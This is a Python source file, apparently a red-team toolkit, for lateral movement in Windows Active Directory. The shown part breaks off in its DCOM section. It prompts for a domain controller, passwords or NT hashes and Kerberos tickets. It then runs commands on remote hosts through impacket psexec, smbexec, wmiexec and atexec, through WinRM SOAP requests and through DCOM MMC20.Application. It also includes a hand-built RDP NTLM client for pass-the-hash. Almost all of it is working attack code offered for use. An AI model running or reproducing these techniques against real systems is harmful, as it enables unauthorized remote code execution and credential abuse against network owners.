#!/usr/bin/env python3

import sys
import os
import glob
import getpass
import socket
import signal
import struct
import hashlib
import hmac
import re
import ipaddress
import base64
import xml.etree.ElementTree as ET
from datetime import datetime, timezone
from binascii import hexlify

from colorama import Fore, Style, init

init(autoreset=True)

# ─────────────────────────────────────────────────────────────────────────────
# GLOBALS & INTERRUPT HANDLING
# ─────────────────────────────────────────────────────────────────────────────
INTERRUPTED = False

def signal_handler(sig, frame):
    global INTERRUPTED
    INTERRUPTED = True
    print(Fore.YELLOW + "\n\n[!] Interrupted by user (Ctrl+C). Exiting gracefully..." + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ─────────────────────────────────────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────────────────────────────────────
R  = Fore.RED
G  = Fore.GREEN
Y  = Fore.YELLOW
B  = Fore.BLUE
C  = Fore.CYAN
W  = Fore.WHITE
M  = Fore.MAGENTA
BO = Style.BRIGHT
RS = Style.RESET_ALL

# ─────────────────────────────────────────────────────────────────────────────
# UTILITY: VALIDATE IP / DOMAIN / CONNECTIVITY
# ─────────────────────────────────────────────────────────────────────────────
def validate_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def check_host_reachable(ip, port=445, timeout=3):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def resolve_domain(dc_ip, domain):
    try:
        socket.gethostbyname(domain)
        return True
    except socket.gaierror:
        return False


def validate_lab_config(dc_ip, domain):
    errors = []
    warnings = []

    if not validate_ip(dc_ip):
        errors.append(f"Invalid IP address format: '{dc_ip}'")
    else:
        ports_to_check = {
            445: "SMB",
            135: "RPC/DCOM",
            3389: "RDP",
            5985: "WinRM (HTTP)",
            5986: "WinRM (HTTPS)",
            88: "Kerberos",
            1433: "MSSQL"
        }

        open_ports = []
        for port, name in ports_to_check.items():
            if check_host_reachable(dc_ip, port, timeout=2):
                open_ports.append(f"{name} ({port})")

        if not open_ports:
            warnings.append(f"No common Windows ports open on {dc_ip}. Is this the correct DC IP?")
        else:
            print(f"  {G}[+] Reachable ports: {', '.join(open_ports)}{RS}")

    if not validate_domain(domain):
        errors.append(f"Invalid domain format: '{domain}' (expected FQDN like domain.com)")

    if not resolve_domain(dc_ip, domain) and not resolve_domain(dc_ip, f"dc.{domain}"):
        warnings.append(f"Cannot resolve domain '{domain}'. DNS may be misconfigured or domain is wrong.")

    if errors:
        print(f"\n{R}{BO}[✗] CRITICAL ERRORS:{RS}")
        for err in errors:
            print(f"  {R}  • {err}{RS}")

    if warnings:
        print(f"\n{Y}{BO}[!] WARNINGS:{RS}")
        for warn in warnings:
            print(f"  {Y}  • {warn}{RS}")

    if errors:
        print(f"\n{R}[!] Please fix the errors above and try again.{RS}")
        return False

    if warnings:
        print(f"\n{Y}[?] Warnings detected. Continue anyway? (y/N): {RS}", end="")
        try:
            choice = input().strip().lower()
            if choice not in ('y', 'yes'):
                print(f"{Y}[~] Aborted by user.{RS}")
                return False
        except (EOFError, KeyboardInterrupt):
            print(f"\n{Y}[~] Aborted.{RS}")
            return False

    return True


# ─────────────────────────────────────────────────────────────────────────────
# SAFE INPUT HANDLER
# ─────────────────────────────────────────────────────────────────────────────
def safe_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(R + "[!] This field cannot be empty!" + RS)
                continue
            if validator and value and not validator(value):
                print(R + f"[!] {error_msg}" + RS)
                continue
            return value
        except KeyboardInterrupt:
            print(Y + "\n\n[!] Exiting... Goodbye!" + RS)
            sys.exit(0)


def safe_getpass(prompt):
    try:
        return getpass.getpass(prompt)
    except (EOFError, KeyboardInterrupt):
        print(Y + "\n[!] Input interrupted. Returning to menu..." + RS)
        return None


# ─────────────────────────────────────────────────────────────────────────────
# BANNER
# ─────────────────────────────────────────────────────────────────────────────
def banner():
    print(C + BO + """
    ╔═══════════════════════════════════════════════════════════════╗
    ║            L A T E R A L   M O V E M E N T                    ║
    ║     Abuse: AdminTo | CanRDP | CanPSRemote | DCOM | SQL        ║
    ║          HasSession | RemoteInt | ClaimSpec | Kerberos        ║
    ╚═══════════════════════════════════════════════════════════════╝
    """ + RS)


# ─────────────────────────────────────────────────────────────────────────────
# INTERACTIVE CONFIG
# ─────────────────────────────────────────────────────────────────────────────
def get_config():


    dc_ip = safe_input(
        C + "[?] Enter DC IP Address  : " + RS,
        validate_ip, "Invalid IP! Example: 10.0.0.1"
    )

    domain = safe_input(
        C + "[?] Enter Domain Name    : " + RS,
        validate_domain, "Invalid domain! Example: domain.com"
    )

    print(f"\n{B}[*] Validating Connection...{RS}")
    if not validate_lab_config(dc_ip, domain):
        return None, None

    print(f"\n  {G}[+] Using: {dc_ip} | {domain}{RS}\n")
    return dc_ip, domain


def get_creds():
    print(f"\n{C}{BO}[ Credentials ]{RS}")

    username = safe_input(C + "[?] Enter Username       : " + RS)

    print(f"\n  {W}Auth method:{RS}")
    print(f"    {C}[1]{W} Password{RS}")
    print(f"    {C}[2]{W} NT Hash{RS}")
    print(f"    {C}[3]{W} Kerberos Ticket (ccache){RS}")

    ch = safe_input(
        C + "[?] Your choice          : " + RS,
        lambda x: x in ['1', '2', '3'],
        "Invalid choice! Enter 1, 2 or 3"
    )

    password = ""
    nt_hash  = ""
    ccache   = ""

    if ch == "2":
        nt_hash = safe_input(C + "[?] NT Hash (LM:NT or NT): " + RS)
        if ':' in nt_hash:
            lm, nt = nt_hash.split(':')
            if len(lm) == 32 and len(nt) == 32:
                nt_hash = nt
            else:
                print(R + "[!] Invalid hash format!" + RS)
                return None, None, None, None
        elif len(nt_hash) != 32:
            print(R + "[!] Invalid NT hash! Must be 32 hex chars." + RS)
            return None, None, None, None
    elif ch == "3":
        ccache = safe_input(C + "[?] ccache file path    : " + RS)
        if not os.path.exists(ccache):
            print(R + f"[!] File not found: {ccache}" + RS)
            return None, None, None, None
    else:
        password = safe_getpass(C + "[?] Enter Password       : " + RS)
        if password is None:
            return None, None, None, None

    return username, password, nt_hash, ccache


# ─────────────────────────────────────────────────────────────────────────────
# MAIN MENU
# ─────────────────────────────────────────────────────────────────────────────
def show_menu():
    print(f"\n  {C}┌─────────────────────────────────────────────────────────────┐")
    print(f"  │              SELECT LATERAL MOVEMENT TECHNIQUE              │")
    print(f"  ├─────────────────────────────────────────────────────────────┤")
    print(f"  │  {W}[1] AdminTo    → psexec / smbexec / wmiexec / atexec   {C}  │")
    print(f"  │  {W}[2] CanRDP     → Remote Desktop (Pass-the-Hash)         {C}  │")
    print(f"  │  {W}[3] CanPSRemote→ PowerShell Remoting (WinRM)            {C}  │")
    print(f"  │  {W}[4] ExecuteDCOM→ DCOM / MMC20.Application                {C}  │")
    print(f"  │  {W}[5] SQLAdmin   → MSSQL xp_cmdshell                       {C}  │")
    print(f"  │  {W}[6] HasSession  → Session enumeration / token theft       {C}  │")
    print(f"  │  {W}[7] RemoteInt   → RestrictedAdmin RDP                    {C}  │")
    print(f"  │  {W}[8] ClaimSpec  → RBCD / S4U2Self (Resource-Based CD)     {C}  │")
    print(f"  │  {W}[9] Kerberos   → Ticket dump / parse / convert / PTT     {C}  │")
    print(f"  │  {W}[0] exit                                                  {C}  │")
    print(f"  └─────────────────────────────────────────────────────────────┘{RS}")
    return safe_input(
        C + "[?] Your choice          : " + RS,
        lambda x: x in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
        "Invalid choice! Enter 0-9"
    )


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 1 — AdminTo (psexec, smbexec, wmiexec, atexec via impacket)
# ════════════════════════════════════════════════════════════════════════════
def technique_adminto(target, domain, username, password, nt_hash, ccache):
    print(f"\n{C}{BO}[ TECHNIQUE 1: AdminTo — Remote Execution ]{RS}")
    print(f"  {Y}Requires: Local Admin on target{RS}")
    print(f"  {Y}Edges: AdminTo, MemberOf (local admin){RS}\n")

    print(f"  {W}Select method:{RS}")
    print(f"    {C}[1]{W} psexec  — Upload service binary (noisiest, most reliable){RS}")
    print(f"    {C}[2]{W} smbexec — Create temp service per command (semi-interactive){RS}")
    print(f"    {C}[3]{W} wmiexec — WMI/DCOM process creation (stealthiest){RS}")
    print(f"    {C}[4]{W} atexec  — Scheduled task (runs as SYSTEM){RS}")

    method = safe_input(
        C + "[?] Your choice          : " + RS,
        lambda x: x in ['1', '2', '3', '4'],
        "Invalid choice! Enter 1-4"
    )

    command = safe_input(
        C + "[?] Command to execute   : " + RS,
        allow_empty=True
    ) or "whoami"

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
    hashes = f"{lm_hash}:{nt_hash}" if nt_hash else None

    print(f"\n  {B}[*] Connecting to {target}...{RS}")

    try:
        if method == "1":
            from impacket.examples.psexec import PSEXEC
            execer = PSEXEC(command, None, None, None, username=username,
                           password=password, domain=domain, hashes=hashes,
                           aesKey=None, doKerberos=False, kdcHost=target)
            execer.run(target)
        elif method == "2":
            from impacket.examples.smbexec import SMBEXEC
            if nt_hash:
                execer = SMBEXEC(f"{domain}\\{username}@{target}", share="C$", hashes=hashes)
            else:
                execer = SMBEXEC(f"{domain}\\{username}:{password}@{target}", share="C$")
            execer.run(command)
            output = execer.getOutput()
            if output:
                print(f"\n{G}{BO}[ OUTPUT ]{RS}")
                print(f"{W}{output}{RS}")
        elif method == "3":
            from impacket.examples.wmiexec import WMIEXEC
            if nt_hash:
                execer = WMIEXEC(f"{domain}\\{username}@{target}", share="ADMIN$", hashes=hashes)
            else:
                execer = WMIEXEC(f"{domain}\\{username}:{password}@{target}", share="ADMIN$")
            execer.run(command)
            output = execer.getOutput()
            if output:
                print(f"\n{G}{BO}[ OUTPUT ]{RS}")
                print(f"{W}{output}{RS}")
        elif method == "4":
            from impacket.examples.atexec import TSCH_EXEC
            if nt_hash:
                execer = TSCH_EXEC(f"{domain}\\{username}@{target}", command, hashes=hashes)
            else:
                execer = TSCH_EXEC(f"{domain}\\{username}:{password}@{target}", command)
            execer.run(target)

        print(f"\n  {G}[+] Execution completed successfully{RS}")

    except ImportError as ie:
        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
        print(f"  {Y}    Install: pip install impacket{RS}")
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "logon failure" in error_msg or "status_logon_failure" in error_msg:
            print(f"  {R}[!] Authentication failed — wrong credentials or no AdminTo edge{RS}")
        elif "access denied" in error_msg or "status_access_denied" in error_msg:
            print(f"  {R}[!] Access denied — user is not local admin on target{RS}")
        elif "rpc_s_server_unavailable" in error_msg or "unavailable" in error_msg:
            print(f"  {R}[!] RPC server unavailable — target may be down or firewall blocking{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}[!] Connection timeout — target unreachable or wrong IP{RS}")
        elif "name or service not known" in error_msg or "getaddrinfo" in error_msg:
            print(f"  {R}[!] Cannot resolve target — check domain/DNS settings{RS}")
        else:
            print(f"  {R}[!] Error: {e}{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 2 — CanRDP (Pure Python RDP Client with Pass-the-Hash)
# ════════════════════════════════════════════════════════════════════════════
class PureRDPClient:
    """Pure Python RDP client supporting NLA + Pass-the-Hash via CredSSP"""

    def __init__(self, target, domain, username, password="", nt_hash=""):
        self.target = target
        self.domain = domain
        self.username = username
        self.password = password
        self.nt_hash = nt_hash
        self.sock = None

    def connect(self, port=3389):
        """Establish TCP connection to RDP server"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        try:
            self.sock.connect((self.target, port))
            print(f"  {G}[+] TCP connection established to {self.target}:{port}{RS}")
            return True
        except Exception as e:
            print(f"  {R}[!] Connection failed: {e}{RS}")
            return False

    def send_x224_connect_request(self):
        """Send X.224 Connection Request PDU"""
        # RDP Negotiation Request
        rdp_neg_req = bytes([
            0x01, 0x00,       # Type: TYPE_RDP_NEG_REQ
            0x00, 0x00,       # Flags
            0x00, 0x08, 0x00, 0x00,  # Length
            0x00, 0x00, 0x00, 0x00   # RequestedProtocols (PROTOCOL_RDP)
        ])

        # X.224 CR-TPDU
        tpkt_header = bytes([0x03, 0x00])  # Version
        x224_header = bytes([0x0e])  # Length
        dst_ref = bytes([0x00, 0x00])  # Destination reference
        src_ref = bytes([0x00, 0x00])  # Source reference
        class_opt = bytes([0x00])  # Class and options

        cookie = f"Cookie: mstshash={self.username}\r\n".encode('ascii')

        payload = x224_header + dst_ref + src_ref + class_opt + cookie + rdp_neg_req
        length = len(payload) + 4
        tpkt_header += struct.pack('>H', length)

        packet = tpkt_header + payload
        self.sock.sendall(packet)

        # Receive response
        response = self.sock.recv(1024)
        if len(response) < 11:
            print(f"  {R}[!] Invalid RDP negotiation response{RS}")
            return False

        if response[0] != 0x03 or response[1] != 0x00:
            print(f"  {R}[!] Invalid TPKT header{RS}")
            return False

        # Check negotiation type
        neg_type = response[-8]
        if neg_type == 0x02:  # TYPE_RDP_NEG_FAILURE
            fail_code = struct.unpack('<I', response[-4:])[0]
            errors = {
                0x00000001: "SSL required by server",
                0x00000002: "SSL not allowed by server",
                0x00000003: "SSL certificate not on server",
                0x00000004: "Inconsistent flags",
                0x00000005: "Hybrid required by server",
                0x00000006: "SSL with user auth required"
            }
            print(f"  {Y}[!] RDP Negotiation failed: {errors.get(fail_code, f'Unknown error 0x{fail_code:08x}')}{RS}")
            return False
        elif neg_type == 0x01:  # TYPE_RDP_NEG_RSP
            selected_proto = struct.unpack('<I', response[-4:])[0]
            proto_names = {0: "Standard RDP", 1: "TLS", 2: "Hybrid (NLA)", 3: "RDSTLS"}
            print(f"  {G}[+] Negotiated protocol: {proto_names.get(selected_proto, f'0x{selected_proto:08x}')}{RS}")
            return True
        return True

    def ntlm_authenticate(self):
        """Perform NTLM authentication (Pass-the-Hash supported)"""
        print(f"  {B}[*] Starting NTLM authentication...{RS}")

        # NTLMSSP_NEGOTIATE
        ntlm_negotiate = self._build_ntlm_negotiate()

        # TSCredentials structure
        ts_request = self._build_ts_request(ntlm_negotiate)
        credssp_token = self._build_credssp_token(ts_request)

        self.sock.sendall(credssp_token)

        # Receive NTLM CHALLENGE
        response = self._recv_credssp()
        if not response:
            return False

        ntlm_challenge = self._extract_ntlm_from_ts(response)
        if not ntlm_challenge:
            print(f"  {R}[!] Failed to extract NTLM challenge{RS}")
            return False

        print(f"  {G}[+] Received NTLM challenge{RS}")

        # Generate NTLM RESPONSE
        ntlm_response = self._build_ntlm_response(ntlm_challenge)

        # TSCredentials with encrypted credentials
        ts_credentials = self._build_ts_credentials()
        ts_request_final = self._build_ts_request(ntlm_response, ts_credentials)
        credssp_token_final = self._build_credssp_token(ts_request_final)

        self.sock.sendall(credssp_token_final)

        # Receive final response
        final_response = self._recv_credssp()
        if final_response:
            print(f"  {G}[+] NTLM authentication successful!{RS}")
            return True
        return False

    def _build_ntlm_negotiate(self):
        """Build NTLMSSP_NEGOTIATE message"""
        signature = b'NTLMSSP\x00'
        msg_type = struct.pack('<I', 1)  # NEGOTIATE

        flags = (
            0x00020000 |  # NEGOTIATE_56
            0x00080000 |  # NEGOTIATE_128
            0x20000000 |  # NEGOTIATE_EXTENDED_SESSIONSECURITY
            0x00002000 |  # NEGOTIATE_SIGN
            0x00001000 |  # NEGOTIATE_SEAL
            0x00000200 |  # NEGOTIATE_NTLM
            0x00000080 |  # NEGOTIATE_VERSION
            0x00800000 |  # NEGOTIATE_TARGET_INFO
            0x00008000 |  # NEGOTIATE_ALWAYS_SIGN
            0x00020000    # REQUEST_TARGET
        )

        domain_name = self.domain.encode('utf-16le')
        workstation = socket.gethostname().encode('utf-16le')

        payload = (
            signature + msg_type +
            struct.pack('<I', flags) +
            struct.pack('<H', len(domain_name)) + struct.pack('<H', len(domain_name)) + struct.pack('<I', 32 + len(workstation)) +
            struct.pack('<H', len(workstation)) + struct.pack('<H', len(workstation)) + struct.pack('<I', 32) +
            b'\x05\x01\x28\x0a\x00\x00\x00\x0f' +  # Version
            domain_name + workstation
        )
        return payload

    def _build_ntlm_response(self, challenge_msg):
        """Build NTLMSSP_AUTH message with Pass-the-Hash support"""
        signature = b'NTLMSSP\x00'
        msg_type = struct.pack('<I', 3)  # AUTHENTICATE

        # Parse challenge
        flags = struct.unpack('<I', challenge_msg[20:24])[0]
        challenge = challenge_msg[24:32]

        # Generate response
        if self.nt_hash:
            # Pass-the-Hash: use provided NT hash directly
            nt_hash_bytes = bytes.fromhex(self.nt_hash)
            lm_hash_bytes = bytes.fromhex("aad3b435b51404eeaad3b435b51404ee")
        else:
            # Calculate from password
            nt_hash_bytes = hashlib.new('md4', self.password.encode('utf-16le')).digest()
            lm_hash_bytes = b'\x00' * 16

        # NTLMv2 response
        client_challenge = os.urandom(8)
        timestamp = struct.pack('<Q', int((datetime.utcnow() - datetime(1601, 1, 1)).total_seconds() * 10000000))

        blob = (
            b'\x01\x01\x00\x00\x00\x00\x00\x00' +
            timestamp +
            client_challenge +
            b'\x00\x00\x00\x00' +
            b'\x00\x00\x00\x00'
        )

        nt_proof_str = hmac.new(nt_hash_bytes, challenge + blob, hashlib.md5).digest()
        nt_response = nt_proof_str + blob
        lm_response = hmac.new(lm_hash_bytes, challenge + client_challenge, hashlib.md5).digest() + client_challenge

        domain = self.domain.encode('utf-16le')
        user = self.username.encode('utf-16le')

        # Build message
        payload = signature + msg_type
        # LmChallengeResponse
        payload += struct.pack('<H', len(lm_response)) * 2 + struct.pack('<I', 64)
        # NtChallengeResponse  
        payload += struct.pack('<H', len(nt_response)) * 2 + struct.pack('<I', 64 + len(lm_response))
        # DomainName
        payload += struct.pack('<H', len(domain)) * 2 + struct.pack('<I', 64 + len(lm_response) + len(nt_response))
        # UserName
        payload += struct.pack('<H', len(user)) * 2 + struct.pack('<I', 64 + len(lm_response) + len(nt_response) + len(domain))
        # Workstation
        payload += struct.pack('<H', 0) * 2 + struct.pack('<I', 64 + len(lm_response) + len(nt_response) + len(domain) + len(user))
        # EncryptedRandomSessionKey
        payload += struct.pack('<H', 0) * 2 + struct.pack('<I', 64 + len(lm_response) + len(nt_response) + len(domain) + len(user))
        # NegotiateFlags
        payload += struct.pack('<I', flags)
        # Version
        payload += b'\x05\x01\x28\x0a\x00\x00\x00\x0f'
        # MIC (empty for now)
        payload += b'\x00' * 16
        # Data
        payload += lm_response + nt_response + domain + user

        return payload

    def _build_ts_request(self, ntlm_token, ts_credentials=None):
        """Build TSRequest ASN.1 structure"""
        # Simplified ASN.1 DER encoding
        token_seq = self._asn1_sequence(self._asn1_octet_string(ntlm_token))

        if ts_credentials:
            cred_seq = self._asn1_sequence(self._asn1_octet_string(ts_credentials))
            return self._asn1_sequence(token_seq[2:] + cred_seq[2:])
        return self._asn1_sequence(token_seq[2:])

    def _build_credssp_token(self, ts_request):
        """Wrap TSRequest in TSPasswordCreds"""
        return ts_request

    def _build_ts_credentials(self):
        """Build TSCredentials with password/domain/username"""
        if self.password:
            creds = self.password.encode('utf-16le')
        else:
            creds = b'\x00' * 2  # Empty password for PTH

        domain = self.domain.encode('utf-16le')
        user = self.username.encode('utf-16le')

        # TSCredentials structure (simplified)
        return domain + user + creds

    def _recv_credssp(self):
        """Receive CredSSP response"""
        try:
            data = b''
            while len(data) < 4:
                chunk = self.sock.recv(4 - len(data))
                if not chunk:
                    return None
                data += chunk

            length = struct.unpack('>H', data[2:4])[0]
            while len(data) < length:
                chunk = self.sock.recv(length - len(data))
                if not chunk:
                    return None
                data += chunk
            return data
        except Exception as e:
            print(f"  {R}[!] Receive error: {e}{RS}")
            return None

    def _extract_ntlm_from_ts(self, ts_response):
        """Extract NTLM token from TSResponse"""
        # Skip TPKT header and find NTLM signature
        data = ts_response[4:] if ts_response[:2] == b'\x03\x00' else ts_response
        ntlm_idx = data.find(b'NTLMSSP\x00')
        if ntlm_idx >= 0:
            return data[ntlm_idx:]
        return None

    def _asn1_sequence(self, data):
        """Build ASN.1 SEQUENCE"""
        length = len(data)
        if length < 128:
            return bytes([0x30, length]) + data
        elif length < 256:
            return bytes([0x30, 0x81, length]) + data
        else:
            return bytes([0x30, 0x82]) + struct.pack('>H', length) + data

    def _asn1_octet_string(self, data):
        """Build ASN.1 OCTET STRING"""
        length = len(data)
        if length < 128:
            return bytes([0x04, length]) + data
        elif length < 256:
            return bytes([0x04, 0x81, length]) + data
        else:
            return bytes([0x04, 0x82]) + struct.pack('>H', length) + data

    def close(self):
        if self.sock:
            self.sock.close()


def technique_canrdp(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 2: CanRDP — Remote Desktop ]{RS}")
    print(f"  {Y}Requires: CanRDP edge or Remote Desktop Users group{RS}")
    print(f"  {Y}Port: 3389 (RDP){RS}")

    if not check_host_reachable(target, 3389, timeout=3):
        print(f"  {Y}[!] Port 3389 (RDP) is not reachable on {target}{RS}")
        print(f"  {Y}    Target may be down, wrong IP, or RDP disabled.{RS}")
        cont = safe_input(
            C + "[?] Continue anyway? (y/N): " + RS,
            allow_empty=True
        )
        if cont.lower() not in ('y', 'yes'):
            return

    print(f"  {W}Select RDP mode:{RS}")
    print(f"    {C}[1]{W} Authenticate only (check credentials + CanRDP edge){RS}")
    print(f"    {C}[2]{W} Full session (basic terminal — experimental){RS}")
    print(f"    {C}[3]{W} Print connection details{RS}")

    mode = safe_input(
        C + "[?] Your choice          : " + RS,
        lambda x: x in ['1', '2', '3'],
        "Invalid choice! Enter 1-3"
    )

    if mode == "3":
        print(f"\n  {C}RDP Connection Details:{RS}")
        print(f"  {W}  Target:   {target}:3389{RS}")
        print(f"  {W}  Domain:   {domain}{RS}")
        print(f"  {W}  Username: {username}{RS}")
        if nt_hash:
            print(f"  {W}  Auth:     Pass-the-Hash (NTLM){RS}")
            print(f"  {W}  NT Hash:  {nt_hash}{RS}")
        else:
            print(f"  {W}  Auth:     Password{RS}")
        print(f"\n  {C}For full GUI, use:{RS}")
        return

    client = PureRDPClient(target, domain, username, password, nt_hash)

    if not client.connect():
        return

    if mode == "1":
        print(f"\n  {B}[*] Attempting NLA authentication...{RS}")
        if client.send_x224_connect_request():
            if client.ntlm_authenticate():
                print(f"\n  {G}{BO}[+] CanRDP edge confirmed!{RS}")
                print(f"  {G}[+] Successfully authenticated to RDP on {target}{RS}")
            else:
                print(f"\n  {R}[!] Authentication failed — no CanRDP edge or wrong credentials{RS}")
        client.close()
    elif mode == "2":
        print(f"\n  {Y}[!] Full RDP session requires GUI libraries (PyQt/GTK){RS}")
        print(f"  {Y}    This toolkit focuses on authentication & lateral movement.{RS}")
        print(f"  {C}For full session, build RDP client with:{RS}")
        print(f"  {W}  pip install pyqt5 pyfreerdp{RS}")
        client.close()


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 3 — CanPSRemote (PowerShell Remoting / WinRM via requests)
# ════════════════════════════════════════════════════════════════════════════
def technique_canpsremote(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 3: CanPSRemote — PowerShell Remoting ]{RS}")
    print(f"  {Y}Requires: CanPSRemote edge or WinRM enabled + admin{RS}")
    print(f"  {Y}Ports: 5985 (HTTP) / 5986 (HTTPS){RS}")

    port = 5985
    use_ssl = False
    if check_host_reachable(target, 5986, timeout=2):
        port = 5986
        use_ssl = True
        print(f"  {G}[+] WinRM HTTPS (5986) is available{RS}")
    elif check_host_reachable(target, 5985, timeout=2):
        print(f"  {G}[+] WinRM HTTP (5985) is available{RS}")
    else:
        print(f"  {Y}[!] WinRM ports (5985/5986) not reachable on {target}{RS}")
        print(f"  {Y}    WinRM may not be enabled or target is wrong.{RS}")
        cont = safe_input(
            C + "[?] Continue anyway? (y/N): " + RS,
            allow_empty=True
        )
        if cont.lower() not in ('y', 'yes'):
            return

    command = safe_input(
        C + "[?] PowerShell command   : " + RS,
        allow_empty=True
    ) or "whoami"

    print(f"\n  {B}[*] Attempting WinRM connection...{RS}")

    try:
        import requests
        from requests.auth import HTTPBasicAuth

        endpoint = f"{'https' if use_ssl else 'http'}://{target}:{port}/wsman"

        # Build SOAP envelope for ExecuteCommand
        soap_body = f'''<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/transfer"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <a:To>{endpoint}</a:To>
    <a:ReplyTo>
      <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
    <a:MessageID>uuid:{os.urandom(16).hex()}</a:MessageID>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:ShellId>uuid:{os.urandom(16).hex()}</w:ShellId>
  </s:Header>
  <s:Body>
    <rsp:CommandLine xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
      <rsp:Command>powershell.exe -Command "{command}"</rsp:Command>
    </rsp:CommandLine>
  </s:Body>
</s:Envelope>'''

        auth = None
        if nt_hash:
            # NTLM auth with hash
            from requests_ntlm import HttpNtlmAuth
            lmhash = "aad3b435b51404eeaad3b435b51404ee"
            auth = HttpNtlmAuth(f"{domain}\\{username}", "", f"{lmhash}:{nt_hash}")
        else:
            auth = HTTPBasicAuth(f"{domain}\\{username}", password)

        print(f"  {B}[*] Sending WinRM request to {endpoint}...{RS}")

        response = requests.post(
            endpoint,
            data=soap_body,
            auth=auth,
            headers={'Content-Type': 'application/soap+xml;charset=UTF-8'},
            verify=False,
            timeout=30
        )

        if response.status_code == 200:
            print(f"  {G}[+] WinRM command executed successfully{RS}")
            # Parse SOAP response
            try:
                root = ET.fromstring(response.text)
                # Extract output from response
                for elem in root.iter():
                    if 'Stream' in elem.tag:
                        text = elem.text
                        if text:
                            try:
                                decoded = base64.b64decode(text).decode('utf-8', errors='replace')
                                print(f"  {W}{decoded}{RS}")
                            except:
                                print(f"  {W}{text}{RS}")
            except Exception as e:
                print(f"  {Y}[~] Could not parse XML response: {e}{RS}")
                print(f"  {W}Raw response:\n{response.text[:500]}{RS}")
        elif response.status_code == 401:
            print(f"  {R}[!] Authentication failed — wrong credentials or no CanPSRemote edge{RS}")
        elif response.status_code == 403:
            print(f"  {R}[!] Access denied — WinRM enabled but user not authorized{RS}")
        else:
            print(f"  {R}[!] WinRM error: HTTP {response.status_code}{RS}")
            print(f"  {W}{response.text[:200]}{RS}")

    except ImportError as ie:
        if "requests_ntlm" in str(ie):
            print(f"  {R}[!] Missing dependency: requests_ntlm{RS}")
            print(f"  {Y}    Install: pip install requests requests_ntlm{RS}")
        else:
            print(f"  {R}[!] Missing dependency: {ie}{RS}")
            print(f"  {Y}    Install: pip install requests{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "connection refused" in error_msg:
            print(f"  {R}[!] Connection refused — WinRM not enabled{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}[!] Connection timeout{RS}")
        else:
            print(f"  {R}[!] WinRM error: {e}{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 4 — ExecuteDCOM (MMC20.Application via impacket DCOM)
# ════════════════════════════════════════════════════════════════════════════
def technique_executedcom(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 4: ExecuteDCOM — DCOM Lateral Movement ]{RS}")
    print(f"  {Y}Requires: ExecuteDCOM edge + local admin{RS}")
    print(f"  {Y}Methods: MMC20.Application, ShellWindows, ShellBrowserWindow{RS}\n")

    print(f"  {W}Select DCOM method:{RS}")
    print(f"    {C}[1]{W} MMC20.Application (Document.ActiveView.ExecuteShellCommand){RS}")
    print(f"    {C}[2]{W} ShellWindows (NavigateAndFind2 + ShellExecute){RS}")

    method = safe_input(
        C + "[?] Your choice          : " + RS,
        lambda x: x in ['1', '2'],
        "Invalid choice! Enter 1 or 2"
    )

    command = safe_input(
        C + "[?] Command to execute   : " + RS,
        allow_empty=True
    ) or "calc.exe"

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""

    print(f"\n  {B}[*] Connecting via DCOM to {target}...{RS}")

    try:
        from impacket.dcerpc.v5.dcomrt import DCOMConnection
        from impacket.dcerpc.v5.dcom import wmi

        if method == "1":
            dcom = DCOMConnection(target, username, password, domain,
                                 lmhash=bytes.fromhex(lm_hash) if lm_hash else b"",
                                 nthash=bytes.fromhex(nt_hash) if nt_hash else b"",
                                 oxidResolver=True, doKerberos=False, kdcHost=target)

            interface = dcom.CoCreateInstanceEx(wmi.CLSID_MMC20Application, wmi.IID_IDispatch)
            iMMC = interface.RemQueryInterface(0, wmi.IID_MMC20Application)

            print(f"  {G}[+] MMC20.Application acquired{RS}")
            print(f"  {B}[*] Executing: {command}{RS}")

            iMMC.Document.ActiveView.ExecuteShellCommand(command, None, None, "7")
            print(f"  {G}[+] Command executed via MMC20.Application{RS}")
            dcom.disconnect()

        else:
            print(f"  {Y}[~] ShellWindows method requires additional setup{RS}")
